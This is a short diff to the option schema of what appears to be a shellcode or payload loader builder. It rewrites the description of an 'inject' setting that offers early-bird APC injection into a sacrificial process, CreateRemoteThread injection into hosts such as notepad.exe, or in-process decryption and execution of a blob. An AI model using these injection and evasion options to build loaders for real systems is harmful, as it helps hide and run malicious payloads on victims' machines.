@@ -76,7 +76,7 @@
       },
       {
         "name": "inject",
-        "description": "Load method baked into the loader: apc = early-bird QueueUserAPC into a parked sacrificial (default), ct = classic CreateRemoteThread (sacrificial must stay alive, e.g. notepad.exe or a real service host), self = run the blob in the loader process and keep it resident without a sacrificial",
+        "description": "Load method baked into the loader: apc = early-bird QueueUserAPC into a parked sacrificial (default), ct = classic CreateRemoteThread (sacrificial must stay alive, e.g. notepad.exe or a real service host), self = minimal in-process runner that decrypts the blob and calls it directly (requires format=exe; no stage DLL, injection, child process, or syscall spoofing)",
         "default": "apc",
         "choices": [
           "apc",
